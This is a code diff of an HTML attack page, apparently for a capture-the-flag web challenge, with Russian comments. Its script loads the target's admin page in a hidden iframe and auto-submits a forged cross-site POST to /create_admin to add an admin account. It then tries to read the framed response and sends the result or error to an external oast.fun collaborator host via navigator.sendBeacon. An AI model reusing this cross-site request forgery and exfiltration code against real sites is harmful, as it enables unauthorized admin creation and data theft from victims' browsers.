@@ -1,47 +1,44 @@
 <!DOCTYPE html>
 <html>
 <body>
+<iframe id="resultFrame" name="resultFrame" style="display:none"></iframe>
+
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// Попробуем получить ответ через onerror/onload
-const iframe = document.createElement('iframe');
-iframe.style.display = 'none';
+// 1. Сначала загружаем iframe с целевым сайтом
+const iframe = document.getElementById('resultFrame');
+iframe.src = TARGET + '/admin';
 
-// Пробуем загрузить ответ как HTML
-iframe.src = TARGET + '/create_admin'; // GET запрос
-
-iframe.onload = function() {
+// 2. Через 2 секунды отправляем форму в этот iframe
+setTimeout(() => {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = TARGET + '/create_admin';
+    form.target = 'resultFrame';
+    form.innerHTML = '<input name="new_admin_login" value="DELAYED_FORM">';
+    document.body.appendChild(form);
+    form.submit();
+    
+    // 3. Через ещё 3 секунды пытаемся прочитать iframe
     setTimeout(() => {
         try {
-            // Может быть доступ через contentWindow.document?
-            const content = iframe.contentWindow.document.body.innerHTML;
-            navigator.sendBeacon(COLLAB + '/iframe_load', content.substring(0, 1000));
-        } catch(e) {
-            // Пробуем через name
-            iframe.name = 'test';
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = TARGET + '/create_admin';
-            form.target = 'test';
-            form.innerHTML = '<input name="new_admin_login" value="IFRAME_TEST">';
-            document.body.appendChild(form);
-            form.submit();
+            // Пробуем разные методы чтения
+            const result = iframe.contentWindow.name || 
+                          iframe.contentDocument.title || 
+                          iframe.contentDocument.body.textContent;
             
-            // Через 3 секунды проверяем имя iframe
-            setTimeout(() => {
-                navigator.sendBeacon(COLLAB + '/iframe_name', iframe.contentWindow.name);
-            }, 3000);
+            if (result) {
+                navigator.sendBeacon(COLLAB + '/final_result', String(result).substring(0, 1000));
+            } else {
+                navigator.sendBeacon(COLLAB + '/no_result', 'empty');
+            }
+        } catch(e) {
+            navigator.sendBeacon(COLLAB + '/cors_error', e.message);
         }
-    }, 1000);
-};
-
-iframe.onerror = function() {
-    navigator.sendBeacon(COLLAB + '/iframe_error', 'error_loading');
-};
-
-document.body.appendChild(iframe);
+    }, 3000);
+}, 2000);
 </script>
 </body>
 </html>
